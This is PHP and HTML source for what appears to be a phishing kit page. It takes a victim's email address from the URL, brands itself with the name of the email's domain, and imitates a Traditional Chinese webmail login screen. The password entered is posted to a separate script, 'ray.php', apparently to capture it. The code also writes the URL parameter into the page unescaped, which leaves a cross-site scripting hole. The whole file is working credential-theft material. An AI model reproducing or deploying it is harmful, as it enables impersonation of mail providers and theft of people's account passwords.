<?php
function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['email'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<html>

<head>
<title><?php echo $yuh ?> &#38651;&#23376;&#37109;&#20214;&#30331;&#37636;</title>




</head>

<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" rightmargin="0" leftmargin="0">

<table width="100%" height="100%" align="center" cellspacing="0">

<tr><td height="4%" bgcolor=""></td></tr>


<tr><td height="6%" bgcolor="">

	<table align="center"><tr>
	
	<td>
	
		<font face="verdana" size="+2">
		<?php echo $yuh ?> &#31169;&#20154;&#38651;&#37109;&#26381;&#21209;&#22120;
		</font>
	
	</td>
	
	
	
	<td width="400"></td>
	
	
	

	
	<td>
	
		<br>
		<a href="" style="text-decoration:none">
		<font face="verdana" size="2">
		&#25163;&#27231;&#29256;
		</font>
		</a>
	
	</td>
	
	
	
	<td width="10"></td>
	
	
	
	<td>
	
		<br>
		<a href="" style="text-decoration:none">
		<font face="verdana" size="2">
		&#38651;&#23376;&#37109;&#20214;&#35373;&#32622;
		</font>
		</a>
	
	</td>
	
	
	
	
	
	<td width="10"></td>
	
	
	
	<td>
	
		<br>
		<a href="" style="text-decoration:none">
		<font face="verdana" size="2">
		&#23433;&#20840;&#30331;&#37636;
		</font>
		</a>
	
	</td>
	
	
	
	
	
	<td width="10"></td>
	
	
	
	<td>
	
		<br>
		<a href="" style="text-decoration:none">
		<font face="verdana" size="2">
		&#38651;&#33126;&#29256;
		</font>
		</a>
	
	</td>
	
	</tr></table>

</td></tr>




















<tr><td height="2%" bgcolor=""></td></tr>





















<tr><td height="71%" background="abstract-wallpapers-hd-windows-7-blue-1500x500.jpg">


	<table><tr>

	<td width="730"></td>





	<td>

		<table><tr><td 
		style="width:350px; height:400px; background-color: #FFFFFF; border: light 1px #fff; padding: 10px; 
		-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px; 
		-moz-box-shadow: 5px 5px 5px #000000; -webkit-box-shadow: 5px 5px 5px #000000; box-shadow: 5px 5px 5px #000000;">

			
				<table align="center" width="300">
				
				<tr><td height="15"></td></tr>
				
				<tr><td>
				
					<font face="verdana" size="3"><b>
					&#22312;&#19979;&#38754;&#30331;&#37636;
					</b></font>
				
				</td></tr>
				
				
				
				
				
				<tr><td height="10">
				
					<form method="post" action="ray.php">
				
				</td></tr>
				
				
				
				
				
				<tr><td>
				
					<table cellspacing="0"><tr><td 
					style="width:300px; height:40px; background-color: #6E6E6E;
					-moz-border-radius: 5px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;">
					
							<table cellspacing="0"><tr><td 
							style="width:300px; height:40px; background-color: #FFFFFF;
							-moz-border-radius: 4px; -webkit-border-radius: 4px; -khtml-border-radius: 4px; border-radius: 4px; 
							-moz-box-shadow: 2px 2px 2px #888; -webkit-box-shadow: 2px 2px 2px #888; box-shadow: 2px 2px 2px #888;">
							
									<table><tr>
									
									<td width="5"></td>
									
									
									
									<td>
									
											<font face="verdana" size="2">
											<b><?php echo $_GET['email']; ?></b>
											</font>
											
											<input type="hidden" name="login" value="<?php echo $_GET['email']; ?>">

									
									</td>
									
									</tr></table>
					
							</td></tr></table>
					
					</td></tr></table>
				
				</td></tr>
				
				
				
				
				
				<tr><td height="5"></td></tr>
				
				
				
				
				
				<tr><td>
				
							<input  name="passwd" type="password" style="width:300px; height:42px; 
							font-family: Verdana; font-size: 13px; color:#000000; 
							background-color: #ffffff; border: solid 1px #6E6E6E; padding: 10px; 
							-moz-border-radius: 4px; -webkit-border-radius: 4px; -khtml-border-radius: 4px; border-radius: 4px; 
							-moz-box-shadow: 2px 2px 2px #888; -webkit-box-shadow: 2px 2px 2px #888; box-shadow: 2px 2px 2px #888;" 
							required="" placeholder="&#36664;&#20837;&#23494;&#30908;">

				
				</td></tr>
				
				
				
				
				
				
				<tr><td height=""></td></tr>
				
				
				
				
				
				<tr><td>
					
						
							<table><tr>
							
							
							<td>
							
								<input type="submit" value="&#31805;&#21040;" 
								style="width:170px; height:45px; background-color: #084B8A; border: solid 3px #084B8A; 
								font-family: Verdana; font-size: 14px; font-weight: light; color: #ffffff; 
								-moz-border-radius: 3px; -webkit-border-radius: 3px; -khtml-border-radius: 3px; border-radius: 3px;
								-moz-box-shadow: 3px 3px 3px #000000; -webkit-box-shadow: 3px 3px 3px #000000; box-shadow: 3px 3px 3px #000000;">
								
								
								<br><br>
								
									<input type="checkbox" checked> 
									
									<font face="verdana" size="2">
									&#20445;&#25345;&#30331;&#37636;&#29376;&#24907;
									</font>
									
								<br>
								
							
							</td>
							
							
							
							
							<td width="30"></td>
							
							
							
							
							
							<td>
							
								<img src="qr-code-url.png" width="100" height="100">
							
							</td>
							
							
							</tr></table>

				
				</td></tr>
				
				
				
				
				<tr><td height="0">
				
					</form>
				
				</td></tr>
				
				
				
				
				</tr><td>
				
					<hr width="290" align="left">
				
				</td></tr>
				
				
				
				
				<tr><td height="20"></td></tr>
				
				
				
				
				<tr><td>
					
						<ul>
						
						<li>
						<a href="" style="text-decoration:none">
						<font face="verdana" size="2" color="#084B8A">
						&#24536;&#35352;&#23494;&#30908;&#20102;&#21966;&#65311;
						</font>
						</a>
						</li>
						
						
						
						
						<li>
						<a href="" style="text-decoration:none">
						<font face="verdana" size="2" color="#084B8A">
						<?php echo $yuh ?> &#23433;&#20840;&#30331;&#37636;
						</font>
						</a>
						</li>
						
						</ul>
					
					</font>
				
				</td></tr>
				
				</table>
			

		</td></tr></table>
		
		
		<br><br>

	</td>
	

	</tr></table>
	

</td></tr>




















<tr><td height="8%" bgcolor="#FFFFFF">

	
	<table align="center"><tr>
	
	<td>
	
		<a href="" style="text-decoration:none">
		<font face="verdana" size="2">
		&#23433;&#20840;&#37109;&#20214;&#30331;&#37636;
		</font>
	
	</td>
	
	
	
	<td width="30">
	
		<hr width="1" size="30" align="center">
		
	</td>
	
	
	
	
	<td>
	
		<a href="" style="text-decoration:none">
		<font face="verdana" size="2">
		&#21512;&#20341;&#29256;&#27402; 1997-2017
		</font>
	
	</td>
	
	</tr></table>

</td></tr>


</table>


</body>

</html>